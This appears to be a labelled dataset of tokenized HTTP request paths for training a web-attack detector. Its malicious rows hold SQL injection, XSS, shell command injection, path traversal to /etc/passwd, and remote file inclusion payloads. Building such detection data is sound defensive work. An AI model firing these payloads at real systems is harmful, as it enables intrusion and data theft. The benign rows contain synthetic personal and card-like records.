request	label
/ elffers / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ lecture_05957 / 	0
"/ en-us / fo564rei . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo usnhdt )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ directory / index . php ? path = xxpathxx 	1
"/ v3axg1p8 . dll ?  < script > document . cookie =  "" testxagh = 6987 ;  ""  <  / script > "	1
/ nbasic_1 / 	0
"/ string / modo = insertar & precio =  ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  <  & b1 = pasar + por + caja "	1
/ 1524171249_s / 	0
/ javascript / search . php3 	0
/ string / strings / parameters = 4e03 + 17a9a 	0
/ string / strings / parameters = 1 '  )  where 2852 = 2852 ; select case when 7717 = 7717 then 1 else null end -- 	1
/ dist01_revised / 	0
/ string / strings / parameters = enero 	0
/ string / strings / parameters = '  |   [  5 -ne  $  ( echo oyypmx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / strings / parameters = 1 ,  ( select  ( case when  ( 5726 = 5275 )  then 1 else 1 /  ( select 0 )  end )  ) 	1
"/ help . php ? q =  "" rm \ x09q18952146 \ x09 # "	1
/ 140013 / 	0
/ string / modo = entrar & login = hiller & pwd = ofrecedor & remember = off & b1 = entrar 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' lije '  from dual where 5309 = 5309 and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  )  |  |  ' 	1
/ disamal / 	0
/ string / strings / parameters = 27643638f 	0
/ treatybodies / 	0
/ string / strings / parameters = 1 '  +  ( select mfcd where 6757 = 6757 and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  +  ' 	1
/ r34mj5sy551uzb / 	0
"/ string / strings / parameters = 1 ""  ""  )  ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  # "	1
/ string / strings / parameters = -3879 '  union all select 9814 , 9814 , 9814 , 9814 , 9814 , 9814 , 9814 , 9814 , 9814 -- 	1
"/ string / strings / parameters = -4889 ""  ""  )  )  as vvuo where 8060 = 8060 or  ( 8459 = 8459 )  * 4906 -- "	1
/ darrin / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  and  (  (  ""  "" rthl ""  ""  like  ""  "" rthl "	1
/ string / strings / parameters = 28729 	0
/ fun77692 / 	0
/ string / strings / parameters = cerramiento 	0
/ string / strings / parameters = kristl @ voragolive . vn 	0
/ iowcqrstpynkeqhr / 	0
/ string / strings / parameters = < isindex action = javascript : alert ( 1 )  type = submit value = click > 	1
/ string / strings / parameters = calaceite 	0
"/ m4kkjf8l . idc ?  < meta http-equiv = set-cookie content =  "" testyglc = 8988 ""  > "	1
"/ string / strings / parameters = 1 ""  ""  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null ) "	1
/ string / strings / parameters = c /  pedro hidalgo ,  137 ,  9 ? g 	0
/ string / strings / parameters = -6388 '  +  ( select  ' jqld '  where 8600 = 8600 union all select 8600 , 8600 # 	1
/ string / modo = registro & login = selva & password = cresta-da & nombre = filomena & apellidos = grigoriu + matons & email = delavanti @ brunoseguridad . by & dni = 28318850p & direccion = calle + san + isidro + labrador + 188 ,  + 13 ? h & ciudad = carceln & cp = 50692 & provincia = murcia & ntc = 6210304125395954 & b1 = registrar 	0
/ string / strings / parameters = 43736 	0
/ level505 / 	0
/ boardnew / 	0
/ 000044076 / 	0
"/ string / strings / parameters = ""  `  '  >  < script >  \ x00javascript : alert ( 1 )  <  / script > "	1
"/ yver8r9o . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ vjbrrppi . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = santa cruz de tenerife 	0
/ string / modo = insertar & precio = 2144 & b1 = pasar + por + caja / 	1
/ one-china / 	0
/ 205-ronan / 	0
/ top . php ? stuff = ping ; -w ; 9000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ; 	1
/ 1234000263054348 / 	0
/ string / strings / parameters = francisc 	0
"/ string / strings / parameters = 1 ""  ""  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  and  ""  "" oivc ""  ""  like  ""  "" oivc "	1
/ string / strings / parameters = 4608056297024601 	0
/ string / strings / parameters = patrica0 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  (  ""  "" ksip ""  ""  like  ""  "" ksip "	1
/ pr_03a / 	0
"/ string / strings / parameters = -6971 ""  ""  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ""  "" ifuh ""  ""  like  ""  "" ifuh "	1
/ 194841_1 / 	0
/ string / strings / parameters = tweddle 	0
/ 000103424 / 	0
/ string / modo = registro & login = meera & password = sensualidad & nombre = honoria & apellidosa = mitjavila + oca & email = pennington @ lasexta-f1 . bm & dni = 22456953y & direccion = carolina + corolado ,  + 38 ,  + 11 ? e & ciudad = castielfabib & cp = 29170 & provincia = madrid & ntc = 6608769758873032 & b1 = registrar 	1
"/ 6qbynt4f . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 5018438 / 	0
/ string / modo = entrar & login = nooshin & pwd = e5670cij3 & remember = on & b1 = entrar 	0
/ lakshya / 	0
/ phpmyadmin / documentation . gz 	0
"/ jujgxwav . idc ?  < meta http-equiv = set-cookie content =  "" testknim = 9383 ""  > "	1
/ string / strings / parameters = koline . mathieson @ viavilano . lv 	0
/ trefferstart / 	0
/ string / strings / parameters = .  \  \  .  /  .  \  \  .  /  .  \  \  .  /  .  \  \  .  /  .  \  \  .  /  .  \  \  .  / etc / passwd 	1
/ fwtoolbars / 	0
/ javascript / maven . asmx 	0
/ string / strings / parameters = decour raichs 	0
/ 179744 / 	0
/ usercomments / 	0
/ string / id = 1 ? 	1
/ membermn / 	0
/ string / strings / parameters = 1 '  )  where 9454 = 9454 and char ( 109 )  |  | char ( 79 )  |  | char ( 70 )  |  | char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ javascript / corp . exe 	1
/ mambots / editors / path / jscripts / tiny_mce / plugins / preview / preview . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
"/ u95h6ymu . html ?  < meta http-equiv = set-cookie content =  "" testkhwc = 4028 ""  > "	1
/ javascript / attic . vbs 	0
/ string / strings / parameters = madrigal puigb 	0
/ string / id = 2 & nombre = vino +  .  *  ? rioja & precio = 100 & cantidad = 92 & b1 = aadir + al + carrito 	1
/ viewers / txt . php ? filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini \ x00 	1
/ string / strings / parameters = adlard @ muebemiweb . ke 	0
/ string / strings / parameters = 17652259n 	0
/ javascript / torrents . bat 	0
/ pockyrevolution / 	0
"/ string / strings / parameters = `  ""  '  >  < img src = xxx : x onerror \ x0a = javascript : alert ( 1 )  > "	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo izdfyz  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # 	1
/ 875402 / 	0
/ string / strings / parameters = 1 '  where 8099 = 8099 ; waitfor delay  ' 0 : 0 : 5 '  -- 	1
/ header05 / 	0
/ 467346 / 	0
/ citizen ' s guide to animal control / 	1
/ javascript / windows . manifest 	0
/ 646-229 / 	0
/ napcoware-mexico / 	0
/ examples / jsp / checkbox / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script > 	1
"/ string / strings / parameters = < a href =  ""  \ x07javascript : javascript : alert ( 1 )  ""  id =  "" fuzzelement1 ""  > test <  / a > "	1
/ outreach . vbs 	0
/ string / strings / parameters = 0646137347424943 	0
/ newspaper2 / 	0
/ string / strings / parameters = =   ; 	1
/ 300x250ad / 	0
/ string / strings / parameters = 1647 	0
/ string / strings / parameters = &  & echo $ ifsdkbfut $  (  ( 7 + 8 )  )  $  ( echo $ ifsdkbfut ) dkbfut ' 	1
"/ iv5vkgam . nsf ?  < meta http-equiv = set-cookie content =  "" testfosd = 94 ""  > "	1
/ x-ripper_3 / 	0
/ cgi-bin / test-cgi . tcl 	0
/ comments . php ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / llumt7msyau5y ?  ? 	1
/ javascript / source . properties 	0
"/ j4rdyhw8 . x ?  < script > document . cookie =  "" testrluj = 1420 ;  ""  <  / script > "	1
/ eng_index / 	0
/ rdxdrpm3yy77o / 	0
/ lustmord - zoetrope / 	0
/ green day-warning / 	0
/ icons / folder . open . png 	0
/ string / id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 13 ' injected_param & b1 = aadir + al + carrito 	1
/ myreader / 	0
/ 528438 / 	0
/ swapmagic / 	0
/ program_tools / 	0
/ string / strings / parameters = 1 and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  tzry 	1
/ phpmyadmin / non-existant-389452377 	0
/ string / strings / parameters = 84996241v 	0
/ egaet53a . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ examples / jsp / sessions / admin / general . php ? mode = perlinfo & config [ general ]  [ perl_binary ]  = cat  / etc / passwd |  | 	1
/ mpchess / 	0
/ store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html 	1
/ nav_eyetv250 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; begin dbms_lock . sleep ( 5 )  ;  end and  (  (  (  ""  "" poee ""  ""  =  ""  "" poee "	1
/ javascript / wireless . xml 	0
/ brandimpression / 	0
/ 000111743 / 	0
/ 000048133 / 	0
/ string / strings / parameters = & echo paewvb $  (  ( 55 + 53 )  )  $  ( echo paewvb ) paewvb /  / 	1
/ string / strings / parameters = 1918370923327655 	0
/ mostlyce / jscripts / tiny_mce / plugins / htmltemplate / htmltemplate . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ? 	1
/ string / modo = entrar & login = gloriane & pwd = ae57f5r4 & remember = on & b1 = entrar 	0
/ 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e /  { file } 	1
/ swingin '  thing-keep on swingin '   ( 2005 )  / 	1
/ scripts / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1332008335 , 4 --  & blog = 1 	1
/ string / strings / parameters = legadura 	0
/ string / strings / parameters = franceschini 	0
/ newsclips / 	0
/ main . php ? logout =  ; uname \ x09 > q38215685 \ x09 # 	1
/ string / strings / parameters = 46688 	0
/ string / strings / parameters = -9557 )  where 2891 = 2891 union all select 2891 , 2891 , 2891 , 2891 , 2891 , 2891 , 2891 , 2891 , 2891 -- 	1
/ e9rx3ya4 . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = entrar & login = burch & pwd = 066empe0a6c0a +  & remember = on & b1 = entrar 	1
/ string / modo = entrar & login = alfi & pwd = g46r2ch4 & remember = on & b1 = entrar 	0
"/ string / strings / parameters = "" onblur =  ""  &  # x061 ;  &  # x06c ;  &  # x065 ;  &  # x072 ;  &  # x074 ;  &  # x028 ;  &  # x027 ;  &  # x058 ;  &  # x053 ;  &  # x053 ;  &  # x027 ;  &  # x029 ;  "" "	1
/ mobot_l / 	0
"/ string / strings / parameters = -7416 ""  ""  where 7656 = 7656 order by 1 -- "	1
/ string / strings / parameters = guinon 	0
/ string / strings / parameters = echo $ ifsdeifsg $  (  ( 86 + 72 )  )  $  ( echo $ ifsdeifsg ) deifsg \ 	1
/ string / strings / parameters = alfeo 	0
/ fostoria / 	0
/ cgi-bin / index . php ? op = default & date = 200607 '  union select 1 , 1068432583 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ a9b8bfb628db0e8ab6791e4aa16c0735 / 	0
/ lesblogs_videos / 	0
/ dpo_expertiseteam / 	0
/ studentmoney / 	0
/ 211875 / 	0
/ string / strings / parameters = $  {  @ print ( system (  $ _server [  ' http_user_agent '  ]  )  )  } 	1
/ recordings / cwmail . exe 	1
/ recordings / docs . php ? doc =  .  .  / jpgraph-1 . 12 . 1 / docs / index 	1
/ string / strings / parameters = fresia 	0
/ manu_139 / 	0
/ v15002603 / 	0
/ string / strings / parameters = stalin 	0
/ the_ivisor / 	0
/ string / modoa = registro & login = darn & password = 56rp10a4 & nombre = ravi & apellidos = morell & email = costa_lejeune @ clichotel . my & dni = 16929821g & direccion = ingeniero + mario ,  + 170 + 10-a & ciudad = parets + del + valls & cp = 20577 & provincia = barcelona & ntc = 7457334236490109 & b1 = registrar 	1
/ string / strings / parameters = -5585 '  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual ) 	1
/ scripts / vhost . php ? action = logout & time = 1331909130 	1
/ javascript / advertise . exe 	1
/ ms_7th / 	0
/ string / modo = registro & login = pye & password = 59rola9o & nombre = hermenegilda & apellidos = lunar + de + broy & email = buchsbaum @ cubiertoscbb . dk & dni = 39171878a & direccion = plaa + rectoria + 17 + 8 ? a & ciudad = aljar & cp = 27118 & provincia = salamanca & ntc = 5074100981550289any  set-cookie :  + tamper = 5765205567234876235 & b1 = registrar 	1
/ prodpagewzcou / 	0
/ javascript / tmpl . exe 	1
/ hosting_news / 	0
/ string / strings / parameters = selva 	0
/ string / id = 3 & nombre = ques + o + manchego & precio = 100 & cantidad = 2 & b1 = aadir + al + carrito 	1
"/ 169okeyj . nsf ?  < meta http-equiv = set-cookie content =  "" testxeoi = 3573 ""  > "	1
"/ 7u1pb2xi . exe ?  < meta http-equiv = set-cookie content =  "" testlwwz = 718 ""  > "	1
/ static /  /  .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5cetc / passwd 	1
/ string / strings / parameters = 1 )  where 5774 = 5774 ; select case when 9848 = 2618 then 1 else null end -- 	1
/ string / strings / parameters = zujovic yvosevich 	0
/ coin_collecting / 	0
/ string / str =  $  ( echo bptqej )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi 	1
/ 20040223-newsletter / 	0
/ 047926 / 	0
"/ string / strings / parameters = "" echo $ ifsnikgbf $  (  ( 93 + 83 )  )  $  ( echo $ ifsnikgbf ) nikgbf | "	1
/ string / strings / parameters = 1 %  '  )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  (  '  %  '  =  ' 	1
"/ vmi8bb12 . aspx ?  < script > document . cookie =  "" testlerc = 2575 ;  ""  <  / script > "	1
/ 172720 / 	0
/ javascript / 1000 . exe 	1
/ cpanel / 	0
/ javascript / console . tar . bz2 	0
"/ top . php ? stuff =  ""  ; uname \ x09 > q51581738 \ x09 # "	1
/ cgi-bin / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ examples / servlets / servlet / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ 149307 / 	0
/ string / strings / parameters = 1 '  in boolean mode )  ; waitfor delay  ' 0 : 0 : 5 '  -- 	1
/ string / strings / parameters = del cid labastie 	0
/ _36122 / 	0
/ javascript / science . sh 	0
"/ n1afe1y6 . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 '  |  |  ( select  ' wszt '  from dual where 6854 = 6854 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  )  |  |  ' 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo cjcsgg )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ javascript / forums . xml 	0
/ security-vacancies / 	0
/ field-hockey / 	0
/ string / modo = registro & login = lanae & password = 4e6qu5r5r & nombre = maitena & apellidos = urrupan + moger & email = teulinks-oakman @ 941 . tr & dni = 33814848h & direccion = nuez + de + balboa + 131 + 2-f & ciudad = belinchn & cp = 09515 & provincia = alicante & ntc = 0131468635735450 & b1 = registrar 	0
/ string / strings / parameters = 4650446572677289 	0
/ 000032124 / 	0
/ mjlambie / 	0
/ change_preferences2 . php ? target = xxpathxx ? 	1
/ scripts / index . php ? file =  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ boot . ini 	1
/ 824561 / 	0
/ news / scripts / news_page . php ? script_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  ? 	1
/ cardinal_gifts / 	0
/ spain-hotels / 	0
/ geeksonthego / 	0
"/ qczkquis . cfc ?  < meta http-equiv = set-cookie content =  "" testkwlg = 5591 ""  > "	1
/ uberbackup-0 / 	0
/ javascript / online . dat 	0
/ string / strings / parameters = 1 '  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  ' fahy '  like  ' fahy 	1
/ string / strings / parameters = < youremail >  bcc :  < youremail > 	1
/ rbec2ohx . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo ausqym )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
"/ string / strings / parameters = echo ltoenx $  (  ( 42 + 36 )  )  $  ( echo ltoenx ) ltoenx "" "	1
/ javascript / ico . err 	0
/ string / modo = registro & login = toinette & password = ma $ c3donio & nombre = tali & apellidos = de + tena + leguizamn & email = robin @ comerciosdeaspe . info & dni = 83817692b & direccion = c /  + rio + avia ,  + 105 ,  + 2 ? h & ciudad = cantiveros & cp = 28529 & provincia = guadalajara & ntc = 8330458587602542 & b1 = registrar 	0
/ iuhospital / 	0
/ tk31167-fbabar_dll / 	0
/ string / strings / parameters = < video poster = javascript : alert ( 1 )  /  /  >  <  / video > 	1
/ string / strings / parameters = 7869918811946914 	0
/ lycia - ionia / 	0
/ lib / classes / swift / mime / simplemimeentity . php . 1 	0
/ ahn ' qiraj / 	1
/ 000045298 / 	0
"/ string / strings / parameters = ""  ; echo $ ifsgahiqg $  (  ( 68 + 82 )  )  $  ( echo $ ifsgahiqg ) gahiqg "" "	1
/ past-meetings / 	0
/ winrecon / 	0
/ string / errormsg = any ?   set-cookie :  + tamper = 1041264011025374727 	1
/ scripts / fake . cgi ? arg =  / dir /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = & lt ; img src = javascript &  # 058 ; alert (  & quot ; xss & quot ;  )  & gt ; 	1
/ string / strings / parameters = 4908217523018940 	0
/ template . php ? content_page = http :  /  / test . acunetix . com / acunetix_not_execute ? 	0
/ anuncie_but / 	0
/ templates / barrel / template . tpl . php ? renderer = xxpathxx ? 	1
/ eyespot_cool / 	0
/ newjersey_jerseycity / 	0
/ string / strings / parameters = ; echo $ ifshvloar $  (  ( 38 + 86 )  )  $  ( echo $ ifshvloar ) hvloar ' 	1
/ g5opening / 	0
/ javascript / lists . exe 	1
/ string / strings / parameters = ;  str =  $  ( echo twchku )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ string / strings / parameters = segovia 	0
/ string / modo = registro & login = virchick1 & password = superable & nombre = leonila & apellidos = duran + manero & email = paris-loisel @ viavilano . cr & dni = 49511678s & direccion = burgos ,  + s / n ,  + 1f & ciudad = boimorto & cp = 08191 & provincia = vila & ntc = 1959107690181502 & b1 = registrar 	0
/ string / strings / parameters = 38821598j 	0
"/ um7xpn15 . jsp ?  < meta http-equiv = set-cookie content =  "" testotoy = 6142 ""  > "	1
/ string / strings / parameters = e7ato 	0
/ javascript /  . passwd . out 	1
/ en-us / h5sc3gxy . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ i7prbs22 . aspx ?  < meta http-equiv = set-cookie content =  "" testjnre = 7328 ""  > "	1
/ string / modo = registro & login = shapiro & password = un , tar & nombre = calixto & apellidos = bonas + crehuet & email = perepeczko @ zarasalud . rw & dni = 76410524q & direccion = diposit + 136 ,  + 1g & ciudad = guancha ,  + la & cp = 12214 & provincia = granada & ntc = 2829438543802993 & b1 = registrar 	1
/ string / strings / parameters = < scr < script > ipt > alert (  ' xss '  )  <  / scr <  / script > ipt > 	1
/ string / strings / parameters = 1 '  and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  and  ' qcsi '  =  ' qcsi 	1
/ sl-6025 / 	0
"/ nyvbv05h . pl ?  < meta http-equiv = set-cookie content =  "" testftxz = 5980 ""  > "	1
"/ 1r8cfrlf . do ?  < meta http-equiv = set-cookie content =  "" testydan = 5106 ""  > "	1
/ string / strings / parameters = |  | echo hretta $  (  ( 56 + 9 )  )  $  ( echo hretta ) hretta 	1
/ string / strings / parameters = &  & echo hjtqxe $  (  ( 5 + 51 )  )  $  ( echo hjtqxe ) hjtqxe 	1
/ string / id = 1 & nombre = queso + manchego & precio = 85 /  & cantidad = 56 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo prkges )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
"/ examples / jsp / jsp2 / el / item . fts ? href =  ""  >  < script > alert (  "" ftgate_44002 . nasl ""  )  <  / script >  ; "	1
/ string / strings / parameters = taxcea 	0
/ string / strings / parameters = 0h5rrad0 	0
/ cgi-bin / rvckwz6smkqf . html 	0
"/ string / strings / parameters = ""  >  < img src = javascript : while (  [  {  }  ]  )  ;  > "	1
/ examples / jsp / jsp2 / jspx / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script > 	1
/ mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini 	1
"/ string / strings / parameters = |   [  7 -ne  $  ( echo cwnamn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / modo = insertar & precio = 3929 & b1 = confirmar 	0
"/ 3hlysl2x . aspx ?  < script > document . cookie =  "" testgjbe = 8505 ;  ""  <  / script > "	1
/ wielki slownik hiszpansko-polski / 	0
/ string / strings / parameters = sant esteve de la sarga 	0
/ string / strings / parameters = nicastro 	0
"/  \ x0a \ x0a < script > alert (  \  "" vulnerable \  ""  )  <  / script >  . jsp "	1
/ contact_headquarters / 	0
/ string / modo = registro & login = perez & password = interclusin & nombre = fabrina & apellidos = chomb + mantero & email = casini-fridley @ civicosdns . ws & dnia = 34788445w & direccion = rotonda + palomera + centro + 4 ,  + 5 ? a & ciudad = seriny & cp = 32755 & provincia = madrid & ntc = 6682713987061411 & b1 = registrar 	1
/ 583750 / 	0
/ wiiannoy / 	0
"/ string / modo = registro & login = alane & password = 9u7je & nombre = ignolinda & apellidos = motta & email = fargue-innis @ soycastellano . no & dni = 04469375s & direccion = calle + melchor + cobo + medina ,  + 16 ,  + 6h & ciudad = andorra & cp = 09129 & provincia =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & ntc = 1134011255413195 & b1 = registrar "	1
/ string / strings / parameters = 94335965q 	0
/ 261ce500dfcd7259852564820068dc6d / 	0
/ addpost_newpoll . php ? addpoll = preview & thispath = xxpathxx 	1
/ string / strings / parameters = 1 )  )  as mgvw where 4923 = 4923 union all select null , null , null , null -- 	1
/ string / strings / parameters = '  ;  exec xp_regread 	1
/ string / modo = insertar & precio = 2563 & b1 = confirmar 	0
/ cgi . cgi / testcgi . exe 	1
/ string / strings / parameters = gaal-grillo @ ofertasrusas . com 	0
/ meso01 / 	0
/ string / strings / parameters = re53nc19g93s8 	0
/ examples / jsp / cal / claroline / resourcelinker / resourcelinker . inc . php ? clarolinerepositorysys =  / etc / passwd \ x00 	1
/ 251215 / 	0
/ 121917 / 	0
/ main . php ? stuff =  ' rm q29765145  # 	1
/ string / strings / parameters = 414rd7f132o 	0
/ scripts / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331919009 '  ,  ' 5 '  -- 	1
/ string / strings / parameters = resmini @ barebackspain . yu 	0
/ string / strings / parameters = 8uiza1illo 	0
/ cmsimple2_7 / cmsimple / cms . php ? pth [  ' file '  ]  [  ' config '  ]  =  @ rfiurl ? pth [  ' file '  ]  [  ' config '  ]  =  @ rfiurl ? 	1
/ fs2004 perfectflight a380 / 	0
/ javascript / updated . bz2 	0
/ sysuser / docmgr / iecreate . stm ? template =  .  .  / 	1
/ question114 / 	0
/ javascript / fetch . html 	0
/ jscript . php ? my_ms [ root ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ? 	1
/ sealblue / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo ezcoie )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ lawater / 	0
"/ main . php ? stuff =  ""  & ping \ x0b-w \ x0b7000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
/ string / strings / parameters = zaldua taranco 	0
